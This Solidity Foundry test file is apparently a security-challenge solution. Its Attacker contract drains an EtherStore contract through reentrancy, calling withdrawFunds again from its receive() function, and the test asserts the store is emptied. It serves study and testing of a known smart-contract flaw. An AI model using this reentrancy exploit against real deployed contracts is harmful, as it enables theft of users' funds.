// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {EtherStore} from "src/v2/ether-store/EtherStore.sol";

import "forge-std/Test.sol";
import "forge-std/console.sol";

contract Attacker {

    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    function attackEtherStore() public {
        etherStore.withdrawFunds(0.1 ether);
    }

    receive() external payable {
        if (address(etherStore).balance > 0.1 ether) {
            etherStore.withdrawFunds(1 ether);
        }
    }
}

contract EtherStoreChallenge is Test {

    Attacker private _attacker;

    EtherStore private _etherStore;

    function setUp() external {

        vm.selectFork(vm.createFork(vm.envString("CARDONA_RPC_URL")));

        address _etherStoreAddress = address(0); // TODO
        _etherStore = EtherStore(_etherStoreAddress);

        _attacker = new Attacker(_etherStoreAddress);
    }

    function testSolution() external {

        /** PRE ATTACK ASSERTS */

        assertTrue(address(_etherStore).balance > 0, "EtherStoreChallenge: EtherStore has no balance");
        assertTrue(address(_attacker).balance == 0, "EtherStoreChallenge: attacker already has a balance");

        uint256 _etherStoreBalanceBefore = address(_etherStore).balance;

        /** ATTACK */

        _attacker.attackEtherStore();

        /** POST ATTACK ASSERTS */

        assertTrue(address(_attacker).balance >= _etherStoreBalanceBefore, "EtherStoreChallenge: attacker did not steal enough");
        assertTrue(address(_etherStore).balance == 0, "EtherStoreChallenge: EtherStore still has a balance");
    }
}